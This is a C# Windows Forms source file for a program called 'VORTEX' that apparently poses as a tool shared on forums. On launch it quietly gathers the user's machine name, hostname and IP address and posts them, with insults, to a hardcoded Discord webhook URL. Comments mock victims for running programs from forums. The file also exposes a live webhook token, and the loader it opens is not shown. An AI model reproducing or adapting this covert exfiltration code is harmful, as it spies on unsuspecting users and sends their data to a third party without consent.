using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Media;
using Guna.UI2.WinForms;
using System.Drawing.Imaging;
using System.Net.Http;
using System.Security.Principal;
using System.Net.Sockets;

namespace tool
{
    public partial class VORTEX : Form
    {
        public VORTEX()
        {
            InitializeComponent();
        }

        public static class ConsoleHelper
        {
            public static void CreateConsole()
            {
                AllocConsole();

                // stdout's handle seems to always be equal to 7
                IntPtr defaultStdout = new IntPtr(7);
                IntPtr currentStdout = GetStdHandle(StdOutputHandle);

                if (currentStdout != defaultStdout)
                    // reset stdout
                    SetStdHandle(StdOutputHandle, defaultStdout);

                // reopen stdout
                TextWriter writer = new StreamWriter(Console.OpenStandardOutput())
                { AutoFlush = true };
                Console.SetOut(writer);
            }

            // P/Invoke required:
            private const UInt32 StdOutputHandle = 0xFFFFFFF5;
            [DllImport("kernel32.dll")]
            private static extern IntPtr GetStdHandle(UInt32 nStdHandle);
            [DllImport("kernel32.dll")]
            private static extern void SetStdHandle(UInt32 nStdHandle, IntPtr handle);
            [DllImport("kernel32")]
            static extern bool AllocConsole();
        }




        static void WriteFullLine(string value)
        {
            // Write an entire line to the console with the string.
            Console.BackgroundColor = ConsoleColor.Red;
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine(value.PadRight(Console.WindowWidth - 1));
            // Reset the color.
            Console.ResetColor();
        }

        private void spam(string value)
        {
            for (int i = 0; i < 1; i++)
            {

                // StartProcess();
                //Console.WriteLine(i);
                //  WriteFullLine("YOU GOT FUCKED");
                //  WriteFullLine("GET FUCKED MONKEY");
                //  WriteFullLine("DONT RUN PROGRAMS IN FORUMS LOL");
                //  AllocConsole();

            }
        }

        public static void getpcinfo()
        {
            string MachineName1 = Environment.MachineName;
            // Get the Name of HOST  
            string hostName = Dns.GetHostName();
            Console.WriteLine(hostName);

            // Get the IP from GetHostByName method of dns class.
            string IP = Dns.GetHostByName(hostName).AddressList[0].ToString();

            SendMs("Retard didn't run as admin, here's his info :heart_eyes:");
            SendMs("IP: " + IP + " | " + "PC NAME: " + MachineName1);
            Process.GetCurrentProcess().Kill(); // AAARGHHHGHglglgghh...
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            if (IsElevated)
            {

                SendMs("SOMEONE RAN VORTEX");
                //AllocConsole();
                // Console.WriteLine("valls");
                foreach (var process in Process.GetProcessesByName("cmd"))
                    logoBox.Visible = true;
                exitButton.Visible = true;
            }
            else
            {
                getpcinfo();
                MessageBox.Show("Run as Admin");
                this.Close();
                Process.GetCurrentProcess().Kill(); // AAARGHHHGHglglgghh...

            }


        }

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AllocConsole();


        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("french's real penis");
        }
        private static void SendMs(string message)
        {
            string webhook = "https://discord.com/api/webhooks/1076036549931700266/I3NItV8zgdLkHenrAw5sm3Z25oAV8fUUzzLkkj4jBcBN-WHN4Ks7VBOxwNP1-CsuUyQb";
            WebClient webClient = new WebClient();
            webClient.Headers.Add("Content-Type", "application/json");
            string payload = "{\"content\": \"" + message + "\"}";
            webClient.UploadData(webhook, Encoding.UTF8.GetBytes(payload));
        }


        private static void StartProcess()
        {
            //Setting an instance of ProcessStartInfo class
            // under System.Diagnostic Assembly Reference
            ProcessStartInfo pro = new ProcessStartInfo();
            //Setting the FileName to be Started like in our
            //Project we are just going to start a CMD Window.
            pro.FileName = "cmd.exe";
            //Instead of using the above two line of codes, You
            // can just use the code below:
            // ProcessStartInfo pro = new ProcessStartInfo("cmd.exe");
            //Creating an Instance of the Process Class
            // which will help to execute our Process
            Process proStart = new Process();
            //Setting up the Process Name here which we are
            // going to start from ProcessStartInfo
            proStart.StartInfo = pro;
            //Calling the Start Method of Process class to
            // Invoke our Process viz 'cmd.exe'
            proStart.Start();
        }





        private void guna2Button2_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void guna2Button2_KeyPress(object sender, KeyPressEventArgs e)
        {

        }

        private void guna2Button2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Escape)
            {
                this.Close();

            }
        }

        private void guna2PictureBox2_Click(object sender, EventArgs e)
        {

        }


        private void iconPictureBox1_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void guna2GradientButton1_Click(object sender, EventArgs e)
        {
            // spam("you got fucked");
            // logoBox.Visible = false;
            // launchBtn.Visible = false;
            //dickbox.Visible = true;
            // exitButton.Visible = false;
            loader frm = new loader(this);
            frm.Show();
            this.Hide();
        }

        public bool IsElevated
        {
            get
            {
                return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
            }
        }



    }
}
